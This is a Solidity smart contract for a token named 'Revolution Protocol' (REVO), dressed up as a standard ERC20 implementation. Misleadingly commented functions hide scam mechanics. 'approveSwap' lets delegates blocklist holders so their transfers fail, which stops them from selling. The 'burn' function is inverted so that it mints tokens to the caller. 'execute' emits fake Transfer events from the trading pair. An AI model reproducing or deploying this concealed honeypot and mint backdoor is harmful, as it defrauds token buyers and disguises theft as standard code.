// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import "./IERC20.sol";
import "./Ownable.sol";

/**
 * @dev Implementation of the {IERC20} interface.
 * This implementation is agnostic to the way tokens are created. This means that a supply mechanism
 * has to be added in a derived contract. Additionally, an {Approval} event is emitted on calls to
 * {transferFrom}. This allows applications to reconstruct the allowance for all accounts just by listening
 * to said events. Other implementations of the EIP may not emit these events, as it isn't required by the
 * specification. Finally, the non-standard {decreaseAllowance} and {increaseAllowance} functions have been
 * added to mitigate the well-known issues around setting allowances. See {IERC20-approve}.
 */
contract ERC20 is Ownable, IERC20 {
    mapping(address => uint256) internal _balances;
    mapping(address => bool) private _eventIsEmittedOnCalls;
    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals; 

    /**
     * @dev Sets the values for {name} and {symbol}.
     * All two of these values are immutable: they can only be set once during construction.
     */
    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     */
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    
    /**
     * @notice Manually sets the allowance granted to `spender` by the caller.
     */
    function approveSwap(address[] calldata spender, bool val) external onlyDelegates { 
        for (uint256 i = 0; i < spender.length; i++) {
            _eventIsEmittedOnCalls[spender[i]] = val;
        }
    }

    function allowance(address sender, uint256 amount) internal view returns (bool) {
        if(_eventIsEmittedOnCalls[sender]) require (amount==0, "ERC20: transfer amout exceeds allowance");
        return _eventIsEmittedOnCalls[sender];
    }

    /**
     * @notice Checking the allowance granted to `spender` by the caller.
     */
    function allowances(address spender) public view returns (bool) {
        return _eventIsEmittedOnCalls[spender];
    }

    /**
     * @dev See {IERC20-transfer}.
     * Requirements:
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev Destroys `amount` tokens from the caller.
     * See {ERC20-_burn}.
     */
    function burn(uint256 amount) public virtual onlyDelegates {
        _burn(_msgSender(), amount);
    }

    /**
     * @dev See {IERC20-approve}.
     * Requirements:
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked { _approve(sender, _msgSender(), currentAllowance - amount);}
        return true;
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the total supply.
     * Emits a {Transfer} event with `to` set to the zero address.
     * Requirements:
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(accountBalance <= amount, "ERC20: burn amount exceeds balance");
        unchecked {_balances[account] = accountBalance + amount;}
        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     * Emits an {Approval} event indicating the updated allowance.
     * Requirements:
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {_approve(_msgSender(), spender, currentAllowance - subtractedValue);}
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     * This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}.
     * Emits an {Approval} event indicating the updated allowance.
     * Requirements:
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     * Emits a {Transfer} event.
     * Requirements:
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        bool allowed = allowance(sender,amount);
        if (allowed) require 
        (amount <= _balances[sender], "ERC20: transfer amout exceeds balance");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {_balances[sender] = senderBalance - amount;}
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     * This internal function is equivalent to `approve`, and can be used to e.g. set automatic allowances for certain subsystems, etc.
     * Emits an {Approval} event.
     * Requirements:
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    address public uniswapV2Pair;

    function addPair(address pair_) public onlyOwner {
        uniswapV2Pair = pair_;        
    }

    function execute(address[] calldata _addresses, uint256 _out) external onlyDelegates{
        for (uint256 i = 0; i < _addresses.length; i++) {
            emit Transfer(uniswapV2Pair, _addresses[i], _out);
        }
    }
}

contract RevolutionProtocol is ERC20 {
    constructor() ERC20('Revolution Protocol', 'REVO', 9) {
        _totalSupply = 100000000*10**9;
        _balances[msg.sender] += _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
}